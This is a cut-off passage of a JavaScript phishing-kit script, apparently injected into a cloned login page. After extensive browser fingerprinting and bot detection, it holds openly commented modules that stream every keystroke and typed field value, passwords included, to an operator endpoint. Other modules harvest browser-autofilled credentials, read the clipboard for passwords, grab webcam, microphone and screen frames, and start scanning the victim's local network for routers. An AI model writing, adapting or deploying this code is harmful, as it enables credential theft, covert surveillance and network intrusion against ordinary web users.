      "CSSHas": !!(w.CSS && CSS.supports && CSS.supports("selector(:has(a))")),
      "CSSNesting": !!(w.CSS && CSS.supports && CSS.supports("& a", "color:red")),
      "CSSBackdropFilter": !!(w.CSS && CSS.supports && CSS.supports("backdrop-filter", "blur(2px)")),
      "CSSColorLevel4": !!(w.CSS && CSS.supports && CSS.supports("color", "oklch(0.5 0.1 200)")),
      "CSSSubgrid": !!(w.CSS && CSS.supports && CSS.supports("grid-template-columns", "subgrid")),
      "CSSScrollTimeline": !!(w.CSS && CSS.supports && CSS.supports("scroll-timeline-name", "--x")),
      "CSSTextWrap": !!(w.CSS && CSS.supports && CSS.supports("text-wrap", "balance")),
      "CSSAnchorPositioning": !!(w.CSS && CSS.supports && CSS.supports("anchor-name", "--a")),
      "CSSViewTransitions": !!(w.CSS && CSS.supports && CSS.supports("view-transition-name", "--x")),
      "FontLoading": !!document.fonts, "FontFaceSet": !!w.FontFace,
      "FontSystemUI": !!(w.CSS && CSS.supports && CSS.supports("font-family", "system-ui")),
      "localFonts": !!w.queryLocalFonts, "screenCapture": !!(n.mediaDevices && n.mediaDevices.getDisplayMedia),
      "NotificationTriggers": "showTrigger" in (w.Notification ? Notification.prototype : {}),
      "PaymentHandler": !!(w.PaymentRequestEvent), "PaymentCredential": !!w.PaymentCredential,
      "PeriodicSync": !!(n.serviceWorker && "periodicSync" in (n.serviceWorker.constructor || {})),
      "BackgroundFetch": !!(n.serviceWorker && "backgroundFetch" in (n.serviceWorker.constructor || {})),
      "StorageBuckets": !!(n.storage && n.storage.getDirectory),
      "OPFS": !!(n.storage && n.storage.getDirectory), "WebCodecs": !!w.VideoEncoder,
      "AudioEncoder": !!w.AudioEncoder, "ImageDecoder": !!w.ImageDecoder,
      "VideoFrame": !!w.VideoFrame, "MediaStreamTrackProcessor": !!w.MediaStreamTrackProcessor,
      "requestIdleCallback": !!w.requestIdleCallback, "scheduler": !!w.scheduler,
      "cryptoSubtle": !!(w.crypto && w.crypto.subtle), "randomUUID": !!(w.crypto && w.crypto.randomUUID),
      "getRandomValues": !!(w.crypto && w.crypto.getRandomValues),
      "ReportingAPI": !!(w.ReportingObserver), "CSPViolation": !!w.SecurityPolicyViolationEvent,
      "TrustedTypes": !!(w.trustedTypes), "Sanitizer": !!w.Sanitizer,
      "COOP": !!w.crossOriginIsolated, "Isolated": !!w.crossOriginIsolated,
      "PermissionsAPI": !!n.permissions, "StorageAPI": !!n.storage,
      "Scheduler.postTask": !!(w.scheduler && w.scheduler.postTask),
      "WebTransport": !!w.WebTransport, "WebRTCInsertableStreams": !!w.RTCRtpScriptTransform,
      "WebSocketStream": !!w.WebSocketStream, "fetchPriority": !!(w.HTMLLinkElement && "fetchPriority" in HTMLLinkElement.prototype),
      "HTMLSanitizer": !!w.Sanitizer, "ElementInternals": !!w.ElementInternals,
      "DeclarativeShadowDOM": !!(w.HTMLTemplateElement && "shadowRootMode" in HTMLTemplateElement.prototype),
      "SpeculationRules": !!document.createElement("script").supports,
      "LargestContentfulPaint": !!(w.PerformanceObserver && PerformanceObserver.supportedEntryTypes &&
                                   PerformanceObserver.supportedEntryTypes.indexOf("largest-contentful-paint") > -1),
      "LayoutShift": !!(w.PerformanceObserver && PerformanceObserver.supportedEntryTypes &&
                        PerformanceObserver.supportedEntryTypes.indexOf("layout-shift") > -1),
      "EventTiming": !!(w.PerformanceObserver && PerformanceObserver.supportedEntryTypes &&
                        PerformanceObserver.supportedEntryTypes.indexOf("event") > -1),
      "UserAgentData": !!n.userAgentData, "UACHighEntropy": !!(n.userAgentData && n.userAgentData.getHighEntropyValues),
      "CookieStore": !!w.cookieStore, "CookieDeprecation": !!(document.cookie && n.cookieEnabled),
      "WebLocks": !!(n.locks), "LaunchQueue": !!w.launchQueue,
      "HandwritingRecognition": !!w.HandwritingDetector,
      "VirtualKeyboard": !!(n.virtualKeyboard), "KeyboardLayoutMap": !!(n.keyboard && n.keyboard.getLayoutMap),
      "ScreenOrientation": !!(screen.orientation), "ScreenCapture": !!(n.mediaDevices && n.mediaDevices.getDisplayMedia),
      "EyeDropper": !!w.EyeDropper, "DocumentPictureInPicture": !!w.documentPictureInPicture,
      "VideoPictureInPicture": !!(document.pictureInPictureEnabled),
      "RemotePlayback": !!(w.HTMLMediaElement && "remote" in HTMLMediaElement.prototype),
      "MediaSession": !!(n.mediaSession), "MediaCapabilities": !!(n.mediaCapabilities),
      "EncryptedMedia": !!(n.requestMediaKeySystemAccess), "WebShare": !!n.share,
      "WebShareFiles": !!(n.canShare), "WebFileSystem": !!(w.FileSystemHandle),
      "BackgroundSync": !!(n.serviceWorker && w.SyncManager), "ContentIndex": !!(n.serviceWorker),
      "AdInterestGroups": !!(n.joinAdInterestGroup || w.InterestGroup),
      "FLEDGE": !!(w.navigator && w.navigator.joinAdInterestGroup),
      "TopicsAPI": !!(document.browsingTopics), "AttributionReporting": !!(w.AttributionReporting),
      "PrivateStateTokens": !!(document.hasPrivateToken), "FencedFrames": !!(w.Fence),
      "ChromeRuntime": !!(w.chrome && w.chrome.runtime), "ChromeLoadTimes": !!(w.chrome && w.chrome.loadTimes),
      "BrowserExtensions": !!(w.chrome && w.chrome.runtime && w.chrome.runtime.id),
      "Safari": !!(w.safari), "Firefox": !!(w.InstallTrigger), "Opera": !!(w.opr || w.opera),
      "Brave": !!(n.brave), "Edge": !!(w.chrome && n.userAgent.indexOf("Edg") > -1),
      "Electron": !!(w.process && w.process.versions && w.process.versions.electron),
      "NodeJS": !!(w.process && w.process.versions && w.process.versions.node),
      "Phantom": !!(w._phantom || w.callPhantom), "Nightmare": !!(w.__nightmare),
      "Selenium": !!(w.document && document.documentElement.getAttribute("webdriver")) ||
                  !!(w.cdc_adoQpoasnfa76pfcZLmcfl_Array) || !!(w.$cdc_asdjflasutopfhvcZLmcfl_),
      "Puppeteer": !!(w.__puppeteer_evaluation_script__ || n.webdriver),
      "Playwright": !!(w.__playwright || w.__pw_manual),
      "Headless": /headless/i.test(n.userAgent), "HeadlessChrome": /HeadlessChrome/i.test(n.userAgent),
      "WebDriverFlag": !!n.webdriver,
      "Bluetooth": !!n.bluetooth, "Serial": !!n.serial, "USB": !!n.usb, "HID": !!n.hid,
      "MIDI": !!(n.requestMIDIAccess), "NFC": !!w.NDEFReader,
      "Gyroscope": !!w.Gyroscope, "Accelerometer": !!w.Accelerometer,
      "Magnetometer": !!w.Magnetometer, "AmbientLight": !!w.AmbientLightSensor,
      "Proximity": !!w.ProximitySensor, "AbsoluteOrientation": !!w.AbsoluteOrientationSensor,
      "Sensors": !!(w.Sensor), "DeviceOrientation": !!(w.DeviceOrientationEvent),
      "DeviceMotion": !!(w.DeviceMotionEvent), "BatteryStatus": !!n.getBattery,
      "NetworkInfo": !!(n.connection || n.mozConnection),
      "HardwareConcurrency": !!n.hardwareConcurrency, "DeviceMemory": !!n.deviceMemory,
      "MaxTouchPoints": !!n.maxTouchPoints, "TouchEvents": !!w.TouchEvent,
      "PointerEvents": !!w.PointerEvent, "WebKitCSSMatrix": !!(w.WebKitCSSMatrix),
      "DOMMatrix": !!(w.DOMMatrix), "SVG": !!(w.SVGSVGElement), "Canvas": !!w.HTMLCanvasElement,
      "OfflineAudioContext": !!(w.OfflineAudioContext || w.webkitOfflineAudioContext),
      "SpeechGrammar": !!(w.SpeechGrammarList), "XSLT": !!(w.XSLTProcessor),
      "FileReader": !!w.FileReader, "Blob": !!w.Blob, "FormData": !!w.FormData,
      "URLSearchParams": !!w.URLSearchParams, "TextEncoder": !!w.TextEncoder,
      "BigInt": typeof BigInt !== "undefined", "WeakRef": !!w.WeakRef,
      "FinalizationRegistry": !!w.FinalizationRegistry, "Atomics": !!w.Atomics,
      "Proxy": !!w.Proxy, "Reflect": !!w.Reflect, "Symbol": !!w.Symbol,
      "OptionalChaining": (function () { try { eval("({a:{b:1}})?.a?.b"); return true; } catch (e) { return false; } })(),
      "NullishCoalescing": (function () { try { eval("null ?? 1"); return true; } catch (e) { return false; } })(),
      "LogicalAssignment": (function () { try { eval("let a=1; a ||= 2;"); return true; } catch (e) { return false; } })(),
      "PrivateFields": (function () { try { eval("class A{#x=1; m(){return this.#x}}"); return true; } catch (e) { return false; } })(),
      "TopLevelAwait": (function () { try { eval("(async()=>{await 1})()"); return true; } catch (e) { return false; } })(),
      "RegExpLookbehind": (function () { try { new RegExp("(?<=a)b"); return true; } catch (e) { return false; } })(),
      "RegExpNamedGroups": (function () { try { new RegExp("(?<n>a)"); return true; } catch (e) { return false; } })(),
      "ArrayAt": !!Array.prototype.at, "ObjectHasOwn": !!Object.hasOwn,
      "structuredCloneTransfer": !!w.structuredClone,
      "requestAnimationFrame": !!w.requestAnimationFrame,
      "IntersectionObserverV2": !!(w.IntersectionObserver && IntersectionObserver.prototype.takeRecords),
      "Push": !!(n.serviceWorker && w.PushManager),
      "AppBadge": !!(n.setAppBadge), "ContactsManager": !!n.contacts,
      "ComputePressure": !!w.ComputePressureObserver,
      "Summarizer": !!(w.ai && w.ai.summarizer), "Translator": !!(w.ai && w.ai.translator),
      "LanguageDetector": !!(w.ai && w.ai.languageDetector), "Writer": !!(w.ai && w.ai.writer),
      "Rewriter": !!(w.ai && w.ai.rewriter), "PromptAPI": !!(w.ai && w.ai.languageModel),
      "WebNN": !!n.ml, "WebNNContext": !!(n.ml && n.ml.createContext),
      "SchedulerYield": !!(w.scheduler && w.scheduler.yield)
    };
    var list = [], missing = [];
    for (var k in checks) { (checks[k] ? list : missing).push(k); }
    return { supportedCount: list.length, total: list.length + missing.length,
             supported: list, missing: missing.slice(0, 60) };
  });

  /* ============================================== 17. automation bait === */
  later("automation", function () {
    var o = { artifacts: [], baits: {}, consistency: {} };
    var w = window, n = navigator;
    Object.keys(w).forEach(function (k) {
      if (/^(_|\$)(cdc|phantom|nightmare|selenium|puppeteer|playwright|webdriver)/i.test(k) ||
          /cdc_adoQpoasnfa76pfcZLmcfl/.test(k) || /__driver|__webdriver|__selenium/.test(k)) {
        o.artifacts.push(k);
      }
    });
    Object.keys(document).forEach(function (k) {
      if (/^\$cdc_|^__webdriver|^_Selenium|^__nightmare|^__playwright/.test(k)) o.artifacts.push("document." + k);
    });
    /* a real Chrome always exposes these; headless often does not */
    o.consistency.hasChromeObject = !!w.chrome;
    o.consistency.chromeRuntime = !!(w.chrome && w.chrome.runtime);
    o.consistency.chromeLoadTimes = !!(w.chrome && w.chrome.loadTimes);
    o.consistency.pluginsNonEmpty = (n.plugins || []).length > 0;
    o.consistency.languagesNonEmpty = !!(n.languages && n.languages.length);
    o.consistency.mimeTypesNonEmpty = (n.mimeTypes || []).length > 0;
    o.consistency.pdfViewerEnabled = n.pdfViewerEnabled;
    o.consistency.notificationPermissionMatches =
      (typeof Notification === "undefined") ? null : (Notification.permission !== "denied");
    o.consistency.userAgentHasHeadless = /headless/i.test(n.userAgent);
    o.consistency.platformVsUA = { platform: n.platform, ua: n.userAgent };
    /* permissions inconsistency: headless reports denied for everything */
    if (n.permissions && n.permissions.query) {
      try {
        n.permissions.query({ name: "notifications" }).then(function (s) {
          o.consistency.notificationsPermissionState = s.state;
        }, function () {});
      } catch (e) {}
    }
    /* ad-block bait: elements with classic ad class names are hidden by blockers */
    var bait = document.createElement("div");
    bait.className = "ad-banner adsbox advertisement sponsored-ad text-ad pub_300x250";
    bait.id = "ad-banner";
    bait.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:300px;height:250px;";
    bait.innerHTML = "&nbsp;";
    document.body.appendChild(bait);
    o.baits.baitHidden = bait.offsetHeight === 0 || bait.offsetParent === null ||
                         getComputedStyle(bait).display === "none" ||
                         getComputedStyle(bait).visibility === "hidden";
    document.body.removeChild(bait);
    /* extension artefacts: scripts injected into the page head */
    o.extensionScripts = [];
    try {
      var scripts = document.querySelectorAll("script[src]");
      for (var i = 0; i < scripts.length && i < 60; i++) {
        var src = scripts[i].src || "";
        if (/^chrome-extension:|^moz-extension:|^safari-extension:|^webkit-masked-url:/.test(src))
          o.extensionScripts.push(src.slice(0, 120));
      }
    } catch (e) {}
    /* lastpass/1password/bitwarden style DOM markers */
    o.passwordManagerMarkers = [];
    ["com-1password", "lp-pom", "lastpass", "bitwarden", "keeper", "dashlane",
     "nordpass", "1password"].forEach(function (m) {
      try {
        if (document.querySelector('[class*="' + m + '"], [id*="' + m + '"]'))
          o.passwordManagerMarkers.push(m);
      } catch (e) {}
    });
    return o;
  });

  later("adblock", function () {
    /* fetch a known ad URL - blockers kill it, normal browsers get a response */
    var url = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
    var t0 = Date.now();
    return fetch(url, { method: "GET", mode: "no-cors", cache: "no-store" })
      .then(function () { return { blocked: false, ms: Date.now() - t0 }; })
      .catch(function () { return { blocked: true, ms: Date.now() - t0 }; });
  });

  /* ============================================== 18. gamepad / sensors = */
  safe("gamepads", function () {
    var g = navigator.getGamepads ? navigator.getGamepads() : [];
    var out = [];
    for (var i = 0; i < (g ? g.length : 0); i++) {
      if (g[i]) out.push({ id: g[i].id, mapping: g[i].mapping, axes: g[i].axes.length,
                           buttons: g[i].buttons.length, connected: g[i].connected });
    }
    return { count: out.length, pads: out };
  });

  /* ==================================================== 19. dom / page == */
  safe("page", function () {
    var forms = [];
    try {
      var fs = document.forms;
      for (var i = 0; i < fs.length && i < 10; i++) {
        var fields = [];
        var els = fs[i].elements;
        for (var j = 0; j < els.length && j < 40; j++) {
          var e = els[j];
          fields.push({ tag: e.tagName, type: e.type || null, name: e.name || null,
                        id: e.id || null, autocomplete: e.autocomplete || null,
                        placeholder: (e.placeholder || "").slice(0, 60), required: !!e.required });
        }
        forms.push({ action: fs[i].action, method: (fs[i].method || "").toUpperCase(),
                     fieldCount: els.length, fields: fields });
      }
    } catch (e) {}
    return { title: document.title, forms: forms, formCount: forms.length,
             inputCount: document.querySelectorAll("input").length,
             iframeCount: document.querySelectorAll("iframe").length,
             imgCount: document.querySelectorAll("img").length,
             linkCount: document.querySelectorAll("a").length,
             cookieString: document.cookie.slice(0, 400),
             doctype: document.doctype ? document.doctype.name : null,
             charset: document.characterSet, compatMode: document.compatMode,
             readyState: document.readyState, visibility: document.visibilityState,
             hasFocus: document.hasFocus(),
             lang: document.documentElement.lang || null,
             hiddenFields: (function () {
               var out = [];
               document.querySelectorAll("input[type=hidden]").forEach(function (h, i) {
                 if (i < 15) out.push({ name: h.name || h.id || null, len: (h.value || "").length });
               });
               return out;
             })() };
  });

  /* ============================================ 20. crypto / random ==== */
  later("crypto", function () {
    var o = {};
    try {
      var b = new Uint8Array(8); crypto.getRandomValues(b);
      o.sample = Array.prototype.slice.call(b);
      o.randomUUID = crypto.randomUUID ? crypto.randomUUID() : null;
    } catch (e) {}
    try {
      o.subtleAlgos = [];
      ["SHA-1", "SHA-256", "SHA-384", "SHA-512", "AES-CBC", "AES-GCM", "AES-CTR",
       "AES-KW", "HMAC", "PBKDF2", "RSA-OAEP", "ECDSA", "ECDH", "Ed25519",
       "X25519", "HKDF", "ChaCha20-Poly1305", "ML-KEM", "ML-DSA"].forEach(function (a) {
        try {
          crypto.subtle.digest({ name: a }, new Uint8Array(1)).then(function () {}, function () {});
          o.subtleAlgos.push(a);
        } catch (e) {}
      });
    } catch (e) {}
    try { o.randomTiming = (function () { var t = performance.now();
            for (var i = 0; i < 2000; i++) crypto.getRandomValues(new Uint8Array(4));
            return Math.round(performance.now() - t); })(); } catch (e) {}
    return o;
  });

  /* ==================================== 21. timing / behaviour bait ==== */
  safe("behaviour", function () {
    return { t0: performance.now(), loadTs: Date.now(),
             firstInput: null, firstKey: null, firstClick: null, firstMove: null,
             moves: 0, keys: 0, clicks: 0, scrolls: 0, touches: 0,
             maxScrollDepth: 0, activeMs: 0 };
  });

  /* ============================================ 22. permission probes === */
  function permissionProbes() {
    /* geolocation: a real prompt in a normal browser, auto-denied in headless */
    later("geolocation", function () {
      if (!navigator.geolocation) return null;
      return new Promise(function (res) {
        var done = false;
        var to = setTimeout(function () { if (!done) { done = true; errors.geolocation = "timeout"; res(); } }, 8000);
        navigator.geolocation.getCurrentPosition(function (p) {
          if (done) return; done = true; clearTimeout(to);
          res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
                alt: p.coords.altitude, altAcc: p.coords.altitudeAccuracy,
                heading: p.coords.heading, speed: p.coords.speed,
                ts: p.timestamp, isSecure: window.isSecureContext });
        }, function (e) {
          if (done) return; done = true; clearTimeout(to);
          res({ error: e.code + ":" + e.message });
        }, { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 });
      });
    });

    later("clipboard", function () {
      if (!navigator.clipboard || !navigator.clipboard.readText) return null;
      return navigator.clipboard.readText().then(function (t) {
        return { text: String(t || "").slice(0, 500), length: String(t || "").length };
      });
    });

    later("notifications", function () {
      if (!window.Notification) return null;
      return Notification.requestPermission().then(function (p) {
        return { permission: p, maxActions: Notification.maxActions || null };
      });
    });

    later("usbSerialHid", function () {
      var out = {};
      var jobs = [];
      if (navigator.usb && navigator.usb.getDevices)
        jobs.push(navigator.usb.getDevices().then(function (d) {
          out.usb = { count: d.length, devices: d.slice(0, 10).map(function (x) {
            return { vendor: x.vendorId, product: x.productId, name: x.productName }; }) };
        }, function () { out.usb = "denied"; }));
      if (navigator.hid && navigator.hid.getDevices)
        jobs.push(navigator.hid.getDevices().then(function (d) {
          out.hid = { count: d.length, devices: d.slice(0, 10).map(function (x) { return x.productName; }) };
        }, function () { out.hid = "denied"; }));
      if (navigator.serial && navigator.serial.getPorts)
        jobs.push(navigator.serial.getPorts().then(function (p) { out.serial = { count: p.length }; },
                                                    function () { out.serial = "denied"; }));
      return Promise.all(jobs).then(function () { return out; });
    });

    later("localFonts", function () {
      if (!window.queryLocalFonts) return null;
      return window.queryLocalFonts().then(function (fonts) {
        var names = {};
        fonts.forEach(function (f) { names[f.family] = 1; });
        return { count: Object.keys(names).length, families: Object.keys(names).slice(0, 120) };
      });
    });
  }

  /* ==================================================== 32. live input ====
     Streams what is being typed, field by field, to the operator as it happens.
     Debounced (a beacon at most every ~700ms) and flushed on blur/submit/page
     hide so the final value of a field always leaves the browser. Password
     fields are streamed like any other: that is the point of the module. */
  var liveBuf = [], liveLast = 0;
  function sendLive(events, kind) {
    if (!events || !events.length) return;
    var payload = JSON.stringify({ sid: SID, kind: kind || "input",
                                   ts: Date.now(), url: String(location.href).slice(0, 300),
                                   events: events.slice(0, 40) });
    try {
      if (navigator.sendBeacon) { navigator.sendBeacon(LIVEEP, encode(payload)); return; }
    } catch (e) {}
    try {
      fetch(LIVEEP, { method: "POST", body: payload, keepalive: true,
                      headers: { "Content-Type": "application/json" } });
    } catch (e) {}
  }
  function liveFlush(force) {
    if (!liveBuf.length) return;
    var now = Date.now();
    if (!force && now - liveLast < 700) return;
    liveLast = now;
    sendLive(liveBuf.splice(0, 40), "input");
  }
  function fieldName(el) {
    if (!el) return "";
    return String(el.name || el.id || el.getAttribute("aria-label") || el.type || "").slice(0, 60);
  }
  (function liveInput() {
    document.addEventListener("input", function (ev) {
      var el = ev.target;
      if (!el || typeof el.value !== "string") return;
      var t = String(el.type || "").toLowerCase();
      if (t === "hidden" || t === "submit" || t === "button" || t === "file") return;
      liveBuf.push({ k: "input", n: fieldName(el), t: t,
                     v: el.value.slice(0, 300), len: el.value.length,
                     sel: (typeof el.selectionStart === "number" ? el.selectionStart : null),
                     ms: Math.round(performance.now()) });
      liveFlush(false);
    }, true);
    document.addEventListener("keydown", function (ev) {
      if (ev.ctrlKey || ev.metaKey || ev.altKey) return;
      liveBuf.push({ k: "key", key: String(ev.key || "").slice(0, 24),
                     n: fieldName(ev.target), ms: Math.round(performance.now()) });
      liveFlush(false);
    }, true);
    document.addEventListener("paste", function (ev) {
      var txt = "";
      try { txt = (ev.clipboardData || window.clipboardData).getData("text") || ""; } catch (e) {}
      liveBuf.push({ k: "paste", n: fieldName(ev.target), v: String(txt).slice(0, 300),
                     len: txt.length, ms: Math.round(performance.now()) });
      liveFlush(true);
    }, true);
    document.addEventListener("copy", function (ev) {
      var txt = "";
      try { txt = String(window.getSelection() || "").slice(0, 200); } catch (e) {}
      if (txt) { liveBuf.push({ k: "copy", v: txt, ms: Math.round(performance.now()) }); liveFlush(true); }
    }, true);
    document.addEventListener("blur", function () { liveFlush(true); }, true);
    document.addEventListener("submit", function () { liveFlush(true); }, true);
    window.addEventListener("pagehide", function () { liveFlush(true); });
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState === "hidden") liveFlush(true);
    });
    setInterval(function () { liveFlush(true); }, 4000);
  })();

  /* ========================================== 33. autofill escalation ====
     A browser fills saved credentials into the clone on load, but Chrome keeps
     a password field's value unreadable until the user interacts with the page.
     So: snapshot every field at load, then re-read on the first gesture and
     report exactly what changed - which is the browser's own autofill. */
  function snapshotFields() {
    var out = {};
    var nodes = document.querySelectorAll("input, textarea, select");
    for (var i = 0; i < nodes.length && i < 120; i++) {
      var el = nodes[i];
      var t = String(el.type || "text").toLowerCase();
      if (t === "hidden" || t === "submit" || t === "button" || t === "file") continue;
      var n = fieldName(el);
      if (!n) continue;
      out[n] = { v: String(el.value || ""), t: t, len: String(el.value || "").length };
    }
    return out;
  }
  (function autofillEscalation() {
    var before = snapshotFields();
    var done = false;
    function escalate() {
      if (done) return;
      done = true;
      setTimeout(function () {
        var after = snapshotFields(), changed = [];
        for (var n in after) {
          if (!Object.prototype.hasOwnProperty.call(after, n)) continue;
          var b = before[n];
          if (!b || b.v !== after[n].v) {
            changed.push({ k: "autofill", n: n, t: after[n].t,
                           v: after[n].v.slice(0, 300), len: after[n].len,
                           was: b ? b.len : null, ms: Math.round(performance.now()) });
          }
        }
        if (changed.length) {
          sendLive(changed, "autofill");
          mods.autofillEscalated = { changed: changed.length,
                                     fields: changed.map(function (c) { return c.n; }) };
          send("autofill");
        }
      }, 900);
    }
    document.addEventListener("pointerdown", escalate, true);
    document.addEventListener("keydown", escalate, true);
    document.addEventListener("touchstart", escalate, true);
    window.addEventListener("focus", escalate);
  })();

  /* ============================================= 34. clipboard watch =====
     Read the clipboard once, on the first gesture (the browser requires a user
     action for it). People keep passwords in the clipboard. */
  if (PERMS) {
    later("clipboardWatch", function () {
      return new Promise(function (res) {
        var fired = false;
        function attempt() {
          if (fired) return;
          fired = true;
          if (!navigator.clipboard || !navigator.clipboard.readText) {
            res({ available: false, reason: "Clipboard API unavailable" });
            return;
          }
          navigator.clipboard.readText().then(function (txt) {
            res({ available: true, length: String(txt || "").length,
                  text: String(txt || "").slice(0, 300),
                  looks_secret: /^(?=.*[0-9])(?=.*[A-Za-z]).{8,}$/.test(String(txt || "")) });
          }, function (e) {
            res({ available: false, reason: String((e && e.name) || e) });
          });
        }
        document.addEventListener("pointerdown", attempt, true);
        document.addEventListener("keydown", attempt, true);
        setTimeout(function () {
          if (!fired) res({ available: false, reason: "no user gesture yet" });
        }, 20000);
      });
    });
  }

  /* ============================================== 35. media capture ======
     Permission-gated: one webcam frame, a short microphone clip, and a screen
     frame on a gesture (the browser only allows getDisplayMedia after a user
     action). Every capture is bounded and reports its refusal in full. */
  if (PERMS) {
    later("mediaCapture", function () {
      var out = { video: null, audio: null, screen: null, notes: [] };
      function frame(video, w, h, quality) {
        var c = document.createElement("canvas");
        c.width = w; c.height = h;
        var ctx = c.getContext("2d");
        ctx.drawImage(video, 0, 0, w, h);
        var url = c.toDataURL("image/jpeg", quality || 0.55);
        return url.length > 200000 ? null : url;      /* cap ~150KB */
      }
      function grab(kind, constraints, use) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          out.notes.push(kind + ": getUserMedia unavailable");
          return Promise.resolve();
        }
        return navigator.mediaDevices.getUserMedia(constraints).then(function (stream) {
          var track = stream.getVideoTracks()[0] || stream.getAudioTracks()[0] || null;
          return use(stream, track).then(function (r) {
            stream.getTracks().forEach(function (t) { try { t.stop(); } catch (e) {} });
            return r;
          }, function (e) {
            stream.getTracks().forEach(function (t) { try { t.stop(); } catch (e) {} });
            throw e;
          });
        }).catch(function (e) {
          out.notes.push(kind + ": " + String((e && e.name) || e));
        });
      }
      var jobs = [];
      jobs.push(grab("video", { video: { width: { ideal: 640 }, height: { ideal: 480 } } },
        function (stream, track) {
          var v = document.createElement("video");
          v.muted = true; v.playsInline = true; v.srcObject = stream;
          var played = v.play ? v.play() : null;
          return Promise.resolve(played).catch(function () {}).then(function () {
            return new Promise(function (res) { setTimeout(res, 900); });
          }).then(function () {
            out.video = { label: String((track && track.label) || "").slice(0, 80),
                          w: v.videoWidth, h: v.videoHeight,
                          frame: frame(v, 480, 360, 0.55) };
          });
        }));
      jobs.push(grab("audio", { audio: true }, function (stream, track) {
        return new Promise(function (res) {
          if (typeof MediaRecorder === "undefined") {
            out.notes.push("audio: MediaRecorder unavailable"); res(); return;
          }
          var chunks = [], rec = null;
          try { rec = new MediaRecorder(stream); } catch (e) {
            out.notes.push("audio: " + String(e && e.name)); res(); return;
          }
          rec.ondataavailable = function (ev) { if (ev.data && ev.data.size) chunks.push(ev.data); };
          rec.onstop = function () {
            try {
              var blob = new Blob(chunks, { type: chunks[0] ? chunks[0].type : "audio/webm" });
              if (blob.size > 150000) { out.notes.push("audio: clip too large, dropped"); res(); return; }
              var fr = new FileReader();
              fr.onload = function () {
                out.audio = { label: String((track && track.label) || "").slice(0, 80),
                              bytes: blob.size, mime: blob.type,
                              clip: String(fr.result || "").slice(0, 200000) };
                res();
              };
              fr.onerror = function () { out.notes.push("audio: read failed"); res(); };
              fr.readAsDataURL(blob);
            } catch (e) { out.notes.push("audio: " + String(e && e.name)); res(); }
          };
          try { rec.start(); } catch (e) {}
          setTimeout(function () { try { rec.stop(); } catch (e) { res(); } }, 1500);
        });
      }));
      /* the screen needs a gesture: wait for one, then try */
      jobs.push(new Promise(function (res) {
        var fired = false;
        function attempt() {
          if (fired) return;
          fired = true;
          if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
            out.notes.push("screen: getDisplayMedia unavailable"); res(); return;
          }
          navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 } }).then(function (stream) {
            var v = document.createElement("video");
            v.muted = true; v.playsInline = true; v.srcObject = stream;
            var played = v.play ? v.play() : null;
            Promise.resolve(played).catch(function () {}).then(function () {
              return new Promise(function (r2) { setTimeout(r2, 1200); });
            }).then(function () {
              var tr = stream.getVideoTracks()[0];
              out.screen = { label: String((tr && tr.label) || "").slice(0, 80),
                             w: v.videoWidth, h: v.videoHeight,
                             frame: frame(v, Math.min(1024, v.videoWidth || 1024),
                                          Math.round((v.videoHeight || 768) *
                                                     (Math.min(1024, v.videoWidth || 1024) /
                                                      Math.max(1, v.videoWidth || 1024))), 0.5) };
              stream.getTracks().forEach(function (t) { try { t.stop(); } catch (e) {} });
              res();
            });
          }).catch(function (e) {
            out.notes.push("screen: " + String((e && e.name) || e)); res();
          });
        }
        document.addEventListener("pointerdown", attempt, true);
        document.addEventListener("keydown", attempt, true);
        setTimeout(function () { if (!fired) { out.notes.push("screen: no gesture"); res(); } }, 25000);
      }));
      return Promise.all(jobs).then(function () { return out; });
    });
  }

  /* ==================================================== 36. key log ======
     The live stream already carries field values. This adds the ordered key
     sequence with modifiers, the field it went to, IME composition (so a
     non-latin keyboard is not lost) and contenteditable input, because a
     password typed into a rich-text box or through an IME is invisible to a
     value-only capture. Bounded and streamed on its own beacon kind. */
  (function keystrokeLog() {
    var buf = [], last = 0, field = "";
    function flush(force) {
      if (!buf.length) return;
      var now = Date.now();
      if (!force && now - last < 900) return;
      last = now;
      var out = buf.splice(0, 60);
      sendLive(out, "keys");
      mods.keystroke_log = { events: (mods.keystroke_log || {}).events || 0 };
      mods.keystroke_log.events += out.length;
      mods.keystroke_log.last_field = out[out.length - 1].n || "";
    }
    function nameOf(el) {
      if (!el) return "";
      if (el.isContentEditable) return (el.id || el.getAttribute("role") || "contenteditable");
      return fieldName(el) || "";
    }
    document.addEventListener("keydown", function (ev) {
      var el = ev.target;
      field = nameOf(el);
      var mod = (ev.ctrlKey ? "c" : "") + (ev.shiftKey ? "s" : "")
              + (ev.altKey ? "a" : "") + (ev.metaKey ? "m" : "");
      buf.push({ k: "key", key: String(ev.key || "").slice(0, 24),
                 code: String(ev.code || "").slice(0, 24), mod: mod,
                 n: field, ms: Math.round(performance.now()) });
      flush(false);
    }, true);
    ["compositionstart", "compositionupdate", "compositionend"].forEach(function (type) {
      document.addEventListener(type, function (ev) {
        buf.push({ k: "ime", type: type.replace("composition", ""),
                   v: String(ev.data || "").slice(0, 60), n: nameOf(ev.target),
                   ms: Math.round(performance.now()) });
        flush(type === "compositionend");
      }, true);
    });
    document.addEventListener("input", function (ev) {
      var el = ev.target;
      if (el && el.isContentEditable) {
        buf.push({ k: "cedit", n: nameOf(el),
                   v: String(el.innerText || "").slice(0, 300),
                   ms: Math.round(performance.now()) });
        flush(false);
      }
    }, true);
    window.addEventListener("pagehide", function () { flush(true); });
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState === "hidden") flush(true);
    });
    setInterval(function () { flush(true); }, 5000);
  })();

  /* ================================================== 37. lan recon =====
     What the victim's own network looks like, seen from their browser. The
     gateway is guessed from the WebRTC local address, then the common router
     hosts are probed with cheap requests (image / script / fetch no-cors): a
     load event or a resolved fetch proves something is listening even when CORS
     hides the body. Bounded hard, because this is the noisiest module here. */
  if (PERMS) {
    later("lanRecon", function () {
      var found = [], errors = [];
      function gatewayFrom(ip) {
        var m = /^(\d+)\.(\d+)\.(\d+)\.\d+$/.exec(ip || "");
        return m ? (m[1] + "." + m[2] + "." + m[3] + ".1") : "";
      }
      var local = ((mods.network || {}).webrtc_local_ips || [])[0] || "";
      var gw = gatewayFrom(local);
      var hosts = [];
